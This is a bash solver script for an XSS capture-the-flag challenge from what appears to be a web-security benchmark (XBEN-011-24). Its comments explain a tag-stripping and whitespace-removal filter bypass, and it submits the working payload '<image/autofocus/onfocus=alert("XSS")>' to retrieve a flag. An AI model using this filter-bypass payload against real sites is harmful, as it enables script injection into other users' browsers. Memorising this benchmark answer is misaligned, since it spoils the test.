#!/usr/bin/env bash
# XBEN-011-24 — "Dalgona Challenges", star (tags: xss)
#
# Every tag is stripped except `<image>`, and then every whitespace character is
# removed. `<image>` is the legacy spelling of `<img>`, so the one tag left is a
# real element; `/` separates its attributes now that spaces are gone.
#
# `onerror` on this element makes PhantomJS alert a TypeError of its own before
# the payload is reached, which the checker reads as the wrong message. `onfocus`
# with `autofocus` avoids the load path entirely.
#
# The server renders the page, loads its own rendering in PhantomJS and prints
# the flag when a dialog fires with the message "XSS".
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/page" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --set method=POST \
    --set 'form.solution=<image/autofocus/onfocus=alert("XSS")>' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
